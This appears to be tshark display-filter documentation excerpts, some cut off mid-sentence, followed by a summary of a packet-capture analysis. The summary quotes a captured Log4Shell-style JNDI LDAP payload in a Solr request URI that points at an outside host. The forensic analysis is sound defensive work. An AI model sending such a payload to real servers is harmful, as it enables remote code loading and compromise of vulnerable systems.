JSON file format including only raw hex-encoded packet data.
It can be used with

Example of usage:
tshark -T jsonraw -r file.pcap
tshark -T jsonraw -j "http tcp ip" -x -r file.pcap

Packet Details Markup Language, an XML-based format for the
details of a decoded packet.  This information is equivalent to the

A character string must be decoded from a source encoding during dissection.
If there are decoding errors the resulting string will usually contain
replacement characters:
browser.comment == "string is ����"
The at operator allows testing the raw undecoded data:
@browser.comment == 73:74:72:69:6e:67:20:69:73:20:aa:aa:aa:aa

Strings are enclosed in double quotes:
http.request.method == "POST"
Inside double quotes, you may use a backslash to embed a double quote
or an arbitrary byte represented in either octal or hexadecimal.
browser.comment == "An embedded \" double-quote"
Use of hexadecimal to look for "HEAD":
http.request.method == "\x48EAD"
Use of octal to look for "HEAD":

The analysis of the PCAP file revealed an HTTP GET request targeting a Solr service, as indicated by the URI `/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D`. This request suggests a potential exploitation attempt using JNDI with an LDAP server. The HTTP request headers were successfully extracted, showing the request method, host, user agent, and request URI. However, attempts to extract the raw payload of the HTTP request did not yield any output, possibly due to the absence of raw data in the request or incorrect field usage. The executed command for extracting HTTP requests and headers was successful, while the command for extracting raw payload data did not provide results.
